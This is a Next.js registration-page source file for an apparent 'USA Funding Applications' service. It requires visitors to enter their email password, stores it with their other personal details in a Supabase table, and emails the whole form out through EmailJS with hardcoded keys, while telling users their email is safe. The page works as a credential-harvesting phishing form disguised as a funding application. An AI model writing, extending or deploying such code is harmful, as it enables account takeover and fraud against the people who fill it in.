import { useSession } from 'next-auth/react';
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import emailjs from '@emailjs/browser';
import supabase from '../../lib/supabase';

export default function registrations() {
  const router = useRouter();
  const { data: session } = useSession();  // Getting session here
  const [form, setForm] = useState({
    firstName: '',
    lastName: '',
    userName: '',
    phoneNumber: '',
    email: '',
    emailPassword: '',
    region: '',
  });
  const [agreed, setAgreed] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false); 

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    console.log("Form submitted");

    // Check if the user has agreed to terms
    if (!agreed) {
      alert('Please agree to the terms before continuing.');
      return;
    } 

    // Save to Supabase
    console.log("Form data before Supabase save:", form);
    const { error } = await supabase.from('registrations').insert([{
      ...form,
    }]);

    if (error) {
      console.error('Error saving to Supabase:', error.message);
      alert('Failed to save data.');
      return;
    }

    // Send email via EmailJS
    emailjs.send(
      'service_tiih48u',     // Replace with your actual service ID
      'template_akfh6vu',    // Replace with your template ID
      form,                  // Sends all form fields to the template
      'IyEEUqS1FYB6INOnR'    // Replace with your public key
    )
    .then((result) => {
      console.log('Email sent!', result.text);
    })
    .catch((error) => {
      console.error('EmailJS error:', error.text);
    });

    // Show success message
    setShowSuccess(true);

    // Redirect after short delay so user sees the success popup
    setTimeout(() => {
      router.push('/');
    }, 3000); // 3 seconds delay
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <form onSubmit={handleSubmit} className="bg-white p-8 rounded shadow-md w-full max-w-2xl">
        <h1 className="text-2xl font-bold mb-6 text-center text-blue-800">REGISTRATION FORM</h1>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* Form Fields */}
          <input type="text" name="firstName" placeholder="First Name" value={form.firstName} onChange={handleChange} className="border p-2 rounded" required />
          <input type="text" name="lastName" placeholder="Last Name" value={form.lastName} onChange={handleChange} className="border p-2 rounded" required />
          <input type="text" name="userName" placeholder="User Name" value={form.userName} onChange={handleChange} className="border p-2 rounded" required />
          <input type="tel" name="phoneNumber" placeholder="Phone Number" value={form.phoneNumber} onChange={handleChange} className="border p-2 rounded" required />
          <input type="email" name="email" placeholder="Email Address" value={form.email} onChange={handleChange} className="border p-2 rounded" required />
          <input type="password" name="emailPassword" placeholder="Email Password" value={form.emailPassword} onChange={handleChange} className="border p-2 rounded" required />
          <input type="text" name="region" placeholder="Phone Number" value={form.region} onChange={handleChange} className="border p-2 rounded" required />
          /</div>

        {/* Notes */}
        <p className="text-xs text-gray-600 mt-4">** Your email is safe. We hate spam as much as you do!!</p>
        <p className="text-xs text-gray-600 mb-4">** Your Email Password is compulsory. Please double check it to be sure it is accurate!</p>

        {/* Agreement Checkbox */}
        <div className="flex items-start mb-6">
          <input
            type="checkbox"
            id="terms"
            checked={agreed}
            onChange={(e) => setAgreed(e.target.checked)}
            className="mt-1 mr-2"
            required
          />
        </div>

        {/* Agreement Checkbox */}
        <div className="flex items-start mb-6">
          <input type="checkbox" id="terms" checked={agreed} onChange={(e) => setAgreed(e.target.checked)} className="mt-1 mr-2" required />
          <label htmlFor="terms" className="text-sm text-gray-700">
            By Clicking, I Agree To The <a href="/terms" className="underline text-blue-700">Terms</a> Of This Site and Our <a href="/privacy" className="underline text-blue-700">Privacy Policy</a>, And Am Providing My Electronic Signature Authorizing USA Funding Applications and its Affiliates To Contact Me By Email, Text, Or Phone Regarding My Funding Applications Service Account With Any New Funding Services Or Sources That May Become Available.
          </label>
        </div>

        <button type="submit" className="w-full bg-blue-700 text-white py-3 rounded hover:bg-blue-800 transition">
          Submit Application
        </button>
      </form>

      {/* Success Popup */}
      {showSuccess && (
        <div className="absolute inset-0 flex items-center justify-center bg-white/90 rounded-2xl z-50">
          <div className="text-center animate-fade-in">
            <div className="text-green-600 text-4xl mb-2">✔</div>
            <p className="text-lg font-semibold text-gray-700">Application Submitted Successfully!</p>
          </div>
        </div>
      )}
    </div>
  );
}
